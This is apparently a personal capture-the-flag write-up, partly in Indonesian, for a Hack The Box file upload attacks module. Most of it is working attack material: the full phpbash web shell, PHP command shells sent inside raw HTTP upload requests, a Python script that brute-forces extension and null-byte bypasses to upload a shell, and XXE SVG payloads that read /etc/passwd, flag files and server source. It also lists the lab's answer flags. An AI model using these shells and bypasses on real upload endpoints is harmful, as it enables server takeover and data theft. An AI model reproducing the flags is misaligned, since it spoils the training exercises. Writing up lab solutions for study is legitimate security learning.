

# Absent Validation



```php
<?php
echo system("hostname")
?>
```

solve 1:
ng-610748-fileuploadsabsentverification-fwlvt-85d948986f-g7h2l



# Upload Exploitation

```php
<?php
/* phpbash by Alexander Reid (Arrexel) */
if (ISSET($_POST['cmd'])) {
    $output = preg_split('/[\n]/', shell_exec($_POST['cmd']." 2>&1"));
    foreach ($output as $line) {
        echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8') . "<br>";
    }
    die(); 
} else if (!empty($_FILES['file']['tmp_name']) && !empty($_POST['path'])) {
    $filename = $_FILES["file"]["name"];
    $path = $_POST['path'];
    if ($path != "/") {
        $path .= "/";
    } 
    if (move_uploaded_file($_FILES["file"]["tmp_name"], $path.$filename)) {
        echo htmlentities($filename) . " successfully uploaded to " . htmlentities($path);
    } else {
        echo "Error uploading " . htmlentities($filename);
    }
    die();
}
?>

<html>
    <head>
        <title></title>
        <style>
            html, body {
                max-width: 100%;
            }
        
            body {
                width: 100%;
                height: 100%;
                margin: 0;
                background: #000;
            }
            
            body, .inputtext {
                font-family: "Lucida Console", "Lucida Sans Typewriter", monaco, "Bitstream Vera Sans Mono", monospace;
                font-size: 14px;
                font-style: normal;
                font-variant: normal;
                font-weight: 400;
                line-height: 20px;
                overflow: hidden;
            }
        
            .console {
                width: 100%;
                height: 100%;
                margin: auto;
                position: absolute;
                color: #fff;
            }
            
            .output {
                width: auto;
                height: auto;
                position: absolute;
                overflow-y: scroll;
                top: 0;
                bottom: 30px;
                left: 5px;
                right: 0;
                line-height: 20px;
            }
                                 
            .input form {
                position: relative;
                margin-bottom: 0px;
            }
                     
            .username {
                height: 30px;
                width: auto;
                padding-left: 5px;
                line-height: 30px;
                float: left;
            }

            .input {
                border-top: 1px solid #333333;
                width: 100%;
                height: 30px;
                position: absolute;
                bottom: 0;
            }

            .inputtext {
                width: auto;
                height: 30px;
                bottom: 0px;
                margin-bottom: 0px;
                background: #000;
                border: 0;
                float: left;
                padding-left: 8px;
                color: #fff;
            }
            
            .inputtext:focus {
                outline: none;
            }

            ::-webkit-scrollbar {
                width: 12px;
            }

            ::-webkit-scrollbar-track {
                background: #101010;
            }

            ::-webkit-scrollbar-thumb {
                background: #303030; 
            }
        </style>
    </head>
    <body>
        <div class="console">
            <div class="output" id="output"></div>
            <div class="input" id="input">
                <form id="form" method="GET" onSubmit="sendCommand()">
                    <div class="username" id="username"></div>
                    <input class="inputtext" id="inputtext" type="text" name="cmd" autocomplete="off" autofocus>
                </form>
            </div>
        </div>
        <form id="upload" method="POST" style="display: none;">
            <input type="file" name="file" id="filebrowser" onchange='uploadFile()' />
        </form>
        <script type="text/javascript">
            var username = "";
            var hostname = "";
            var currentDir = "";
            var previousDir = "";
            var defaultDir = "";
            var commandHistory = [];
            var currentCommand = 0;
            var inputTextElement = document.getElementById('inputtext');
            var inputElement = document.getElementById("input");
            var outputElement = document.getElementById("output");
            var usernameElement = document.getElementById("username");
            var uploadFormElement = document.getElementById("upload");
            var fileBrowserElement = document.getElementById("filebrowser");
            getShellInfo();
            
            function getShellInfo() {
                var request = new XMLHttpRequest();
                
                request.onreadystatechange = function() {
                    if (request.readyState == XMLHttpRequest.DONE) {
                        var parsedResponse = request.responseText.split("<br>");
                        username = parsedResponse[0];
                        hostname = parsedResponse[1];
                        currentDir =  parsedResponse[2].replace(new RegExp("&sol;", "g"), "/");
                        defaultDir = currentDir;
                        usernameElement.innerHTML = "<div style='color: #ff0000; display: inline;'>"+username+"@"+hostname+"</div>:"+currentDir+"#";
                        updateInputWidth();
                    }
                };

                request.open("POST", "", true);
                request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                request.send("cmd=whoami; hostname; pwd");
            }
                        
            function sendCommand() {
                var request = new XMLHttpRequest();
                var command = inputTextElement.value;
                var originalCommand = command;
                var originalDir = currentDir;
                var cd = false;
                
                commandHistory.push(originalCommand);
                switchCommand(commandHistory.length);
                inputTextElement.value = "";

                var parsedCommand = command.split(" ");
                
                if (parsedCommand[0] == "cd") {
                    cd = true;
                    if (parsedCommand.length == 1) {
                        command = "cd "+defaultDir+"; pwd";
                    } else if (parsedCommand[1] == "-") {
                        command = "cd "+previousDir+"; pwd";
                    } else {
                        command = "cd "+currentDir+"; "+command+"; pwd";
                    }
                    
                } else if (parsedCommand[0] == "clear") {
                    outputElement.innerHTML = "";
                    return false;
                } else if (parsedCommand[0] == "upload") {
                    fileBrowserElement.click();
                    return false;
                } else {
                    command = "cd "+currentDir+"; " + command;
                }
                
                request.onreadystatechange = function() {
                    if (request.readyState == XMLHttpRequest.DONE) {
                        if (cd) {
                            var parsedResponse = request.responseText.split("<br>");
                            previousDir = currentDir;
                            currentDir = parsedResponse[0].replace(new RegExp("&sol;", "g"), "/");
                            outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+originalDir+"# "+originalCommand+"</div><br>";
                            usernameElement.innerHTML = "<div style='color: #ff0000; display: inline;'>"+username+"@"+hostname+"</div>:"+currentDir+"#";
                        } else {
                            outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# "+originalCommand+"</div><br>" + request.responseText.replace(new RegExp("<br><br>$"), "<br>");
                            outputElement.scrollTop = outputElement.scrollHeight;
                        } 
                        updateInputWidth();
                    }
                };

                request.open("POST", "", true);
                request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                request.send("cmd="+encodeURIComponent(command));
                return false;
            }
            
            function uploadFile() {
                var formData = new FormData();
                formData.append('file', fileBrowserElement.files[0], fileBrowserElement.files[0].name);
                formData.append('path', currentDir);
                
                var request = new XMLHttpRequest();
                
                request.onreadystatechange = function() {
                    if (request.readyState == XMLHttpRequest.DONE) {
                        outputElement.innerHTML += request.responseText+"<br>";
                    }
                };

                request.open("POST", "", true);
                request.send(formData);
                outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# Uploading "+fileBrowserElement.files[0].name+"...</div><br>";
            }
            
            function updateInputWidth() {
                inputTextElement.style.width = inputElement.clientWidth - usernameElement.clientWidth - 15;
            }
            
            document.onkeydown = checkForArrowKeys;

            function checkForArrowKeys(e) {
                e = e || window.event;

                if (e.keyCode == '38') {
                    previousCommand();
                } else if (e.keyCode == '40') {
                    nextCommand();
                }
            }
            
            function previousCommand() {
                if (currentCommand != 0) {
                    switchCommand(currentCommand-1);
                }
            }
            
            function nextCommand() {
                if (currentCommand != commandHistory.length) {
                    switchCommand(currentCommand+1);
                }
            }
            
            function switchCommand(newCommand) {
                currentCommand = newCommand;

                if (currentCommand == commandHistory.length) {
                    inputTextElement.value = "";
                } else {
                    inputTextElement.value = commandHistory[currentCommand];
                    setTimeout(function(){ inputTextElement.selectionStart = inputTextElement.selectionEnd = 10000; }, 0);
                }
            }
            
            document.getElementById("form").addEventListener("submit", function(event){
                event.preventDefault()
            });
        </script>
    </body>
</html>
```


answer: HTB{g07_my_f1r57_w3b_5h3ll}


# Client-Side Validation

bypass dengan file upload extension png dan nanti di hapus ketika dengan burp suite


answer: HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}

# Blacklist Filters

bagiamana saya solve nya? saya menggunakan brup intruder untuk cek extension mana aja yang di izin kan. contoh exploit:

```json
POST /upload.php HTTP/1.1
Host: 94.237.60.129:37978
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.60.129:37978/
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------161693574528295645573438057007
Content-Length: 597
Origin: http://94.237.60.129:37978
Connection: keep-alive
Priority: u=0

-----------------------------161693574528295645573438057007
Content-Disposition: form-data; name="uploadFile"; filename="cmd.phar"
Content-Type: application/x-php

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>

-----------------------------161693574528295645573438057007--
```

# Whitelist Filters

sebenarnya saya sudah tau kalau itu bypass nya dengan cara memberi kan file extension gambar dulu baru brute force extension php

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```


Beberapa karakter khusus seperti `%20`, `%0a`, `%00`, dan lainnya dapat digunakan untuk menyuntikkan atau memanipulasi nama file pada aplikasi web. Dengan memanfaatkan kelemahan dalam cara server menangani karakter ini, kita dapat mengelabui validasi tipe file dan mengunggah skrip berbahaya.

Misalnya, menambahkan `%00` (karakter null) dalam nama file seperti `shell.php%00.jpg` bisa membuat server lama (PHP versi 5.X) membaca nama file hanya sebagai `shell.php`, yang dieksekusi sebagai skrip PHP. Demikian juga, pada server Windows, menambahkan titik dua (`:`) sebelum ekstensi file yang diizinkan dapat menghasilkan file seperti `shell.aspx:.jpg`, tetapi dieksekusi sebagai `shell.aspx`.

Kita bisa membuat skrip bash untuk menghasilkan berbagai kombinasi nama file dengan memasukkan karakter-karakter tersebut sebelum dan sesudah ekstensi `.php` dan `.jpg`, untuk mencoba melewati validasi file dan mengunggah skrip yang bisa dieksekusi.

contoh

```text
shell%20.php.jpg
shell.php%20.jpg
shell.jpg%20.php
shell.jpg.php%20
shell%20.phps.jpg
shell.phps%20.jpg
shell.jpg%20.phps
shell.jpg.phps%20
shell%0a.php.jpg
shell.php%0a.jpg
shell.jpg%0a.php
shell.jpg.php%0a
shell%0a.phps.jpg
shell.phps%0a.jpg
shell.jpg%0a.phps
shell.jpg.phps%0a
shell%00.php.jpg
shell.php%00.jpg
shell.jpg%00.php
shell.jpg.php%00
shell%00.phps.jpg
shell.phps%00.jpg
shell.jpg%00.phps
shell.jpg.phps%00
shell%0d0a.php.jpg
shell.php%0d0a.jpg
shell.jpg%0d0a.php
shell.jpg.php%0d0a
shell%0d0a.phps.jpg
shell.phps%0d0a.jpg
shell.jpg%0d0a.phps
shell.jpg.phps%0d0a
shell/.php.jpg
shell.php/.jpg
shell.jpg/.php
shell.jpg.php/
shell/.phps.jpg
shell.phps/.jpg
shell.jpg/.phps
shell.jpg.phps/
shell.\\.php.jpg
shell.php.\\.jpg
shell.jpg.\\.php
shell.jpg.php.\\
shell.\\.phps.jpg
shell.phps.\\.jpg
shell.jpg.\\.phps
shell.jpg.phps.\\
shell..php.jpg
shell.php..jpg
shell.jpg..php
shell.jpg.php.
shell..phps.jpg
shell.phps..jpg
shell.jpg..phps
shell.jpg.phps.
shell….php.jpg
shell.php….jpg
shell.jpg….php
shell.jpg.php…
shell….phps.jpg
shell.phps….jpg
shell.jpg….phps
shell.jpg.phps…
shell:.php.jpg
shell.php:.jpg
shell.jpg:.php
shell.jpg.php:
shell:.phps.jpg
shell.phps:.jpg
shell.jpg:.phps
shell.jpg.phps:
```

code nya

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

code brute force saya

```python
import requests

  

# Wordlist berdasarkan kombinasi yang diberikan

wordlist = [

"shell.phar.jpg", "shell%20.php.jpg", "shell.php%20.jpg", "shell.jpg%20.php", "shell.jpg.php%20",

"shell%20.phps.jpg", "shell.phps%20.jpg", "shell.jpg%20.phps", "shell.jpg.phps%20",

"shell%0a.php.jpg", "shell.php%0a.jpg", "shell.jpg%0a.php", "shell.jpg.php%0a",

"shell%0a.phps.jpg", "shell.phps%0a.jpg", "shell.jpg%0a.phps", "shell.jpg.phps%0a",

"shell%00.php.jpg", "shell.php%00.jpg", "shell.jpg%00.php", "shell.jpg.php%00",

"shell%00.phps.jpg", "shell.phps%00.jpg", "shell.jpg%00.phps", "shell.jpg.phps%00",

"shell%0d0a.php.jpg", "shell.php%0d0a.jpg", "shell.jpg%0d0a.php", "shell.jpg.php%0d0a",

"shell%0d0a.phps.jpg", "shell.phps%0d0a.jpg", "shell.jpg%0d0a.phps", "shell.jpg.phps%0d0a",

"shell/.php.jpg", "shell.php/.jpg", "shell.jpg/.php", "shell.jpg.php/",

"shell/.phps.jpg", "shell.phps/.jpg", "shell.jpg/.phps", "shell.jpg.phps/",

"shell.\\.php.jpg", "shell.php.\\.jpg", "shell.jpg.\\.php", "shell.jpg.php.\\",

"shell.\\.phps.jpg", "shell.phps.\\.jpg", "shell.jpg.\\.phps", "shell.jpg.phps.\\",

"shell..php.jpg", "shell.php..jpg", "shell.jpg..php", "shell.jpg.php.",

"shell..phps.jpg", "shell.phps..jpg", "shell.jpg..phps", "shell.jpg.phps.",

"shell….php.jpg", "shell.php….jpg", "shell.jpg….php", "shell.jpg.php…",

"shell….phps.jpg", "shell.phps….jpg", "shell.jpg….phps", "shell.jpg.phps…",

"shell:.php.jpg", "shell.php:.jpg", "shell.jpg:.php", "shell.jpg.php:",

"shell:.phps.jpg", "shell.phps:.jpg", "shell.jpg:.phps", "shell.jpg.phps:",

"shell.jpeg.php", "shell.jpg.php", "shell.png.php", "shell.php",

"shell.php3", "shell.php4", "shell.php5", "shell.php7", "shell.php8",

"shell.pht", "shell.phar", "shell.phpt", "shell.pgif", "shell.phtml",

"shell.phtm", "shell.php%00.gif", "shell.php\\x00.gif", "shell.php%00.png",

"shell.php\\x00.png", "shell.php%00.jpg", "shell.php\\x00.jpg"

]

  

BASEURL = "http://83.136.251.216:45049"

uploadURL = BASEURL + "/upload.php"

  

payload = """<?php

if (isset($_POST['cmd'])) {

system($_POST['cmd']);

}

?>"""

  
  

for filename in wordlist:

files = {'uploadFile': (filename, payload)}

response = requests.post(uploadURL, files=files)

if "successfully uploaded" in response.text:

print(f"File berhasil diunggah: {filename}")

accesssImageURL = BASEURL + f"/profile_images/{filename}"

access = requests.get(url=accesssImageURL)

print(f"Response : {access}")

else:

print(f"File gagal diunggah: {filename}")
```


answer: HTB{1_wh173l157_my53lf}


**Type Filters:**

```json
POST /upload.php HTTP/1.1
Host: 94.237.50.225:35521
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.50.225:35521/
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------3004294804399267457798368172
Content-Length: 321
Origin: http://94.237.50.225:35521
Connection: close
Priority: u=0

-----------------------------3004294804399267457798368172
Content-Disposition: form-data; name="uploadFile"; filename="text.jpg.phar"
Content-Type: image/jpeg

GIF8
<?php 
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}?>

-----------------------------3004294804399267457798368172--
```

```json
GET /profile_images/text.jpg.phar?cmd=cat+/flag.txt HTTP/1.1
Host: 94.237.50.225:35521
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

answer: 

```json
HTTP/1.1 200 OK
Date: Sat, 31 Aug 2024 04:38:33 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 39
Connection: close
Content-Type: text/html; charset=UTF-8

GIF8
HTB{m461c4l_c0n73n7_3xpl0174710n}
```

**Limited File Uploads**


```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg>&xxe;</svg>
```

di sini saya menyimpan nya ke file svg lalu upload dan CTRL + U

answer: HTB{my_1m4635_4r3_l37h4l}

payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

response 
```php
<?php
$target_dir = "./images/";
$fileName = basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!preg_match('/^.*\.svg$/', $fileName)) {
    echo "Only SVG images are allowed";
    die();
}

foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/svg+xml'))) {
        echo "Only SVG images are allowed";
        die();
    }
}

if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    $latest = fopen($target_dir . "latest.xml", "w");
    fwrite($latest, basename($_FILES["uploadFile"]["name"]));
    fclose($latest);
    echo "File successfully uploaded";
} else {
    echo "File failed to upload";
}
```

answer: ./images/


**Skills Assessment - File Upload Attacks:**

yang pertama saya lakukan ngecek content type nya yang bisa apa aja, saya brute force.
yang kedua ngecek extension file yang bisa di upload apa aja: shell.phar.jpg, shell.phar.png


upload.php
```php
<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}

```

'yymmdd_$nama file'

payload

```json
POST /contact/upload.php HTTP/1.1
Host: 94.237.53.113:37320
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.53.113:37320/contact/
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------252492795328786194032741075243
Content-Length: 422
Origin: http://94.237.53.113:37320
Connection: keep-alive
Priority: u=0

-----------------------------252492795328786194032741075243
Content-Disposition: form-data; name="uploadFile"; filename="heehe.phar.jpg"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

<?php system("cat /flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt") ?>

-----------------------------252492795328786194032741075243--
```


answer: HTB{m4573r1ng_upl04d_3xpl0174710n}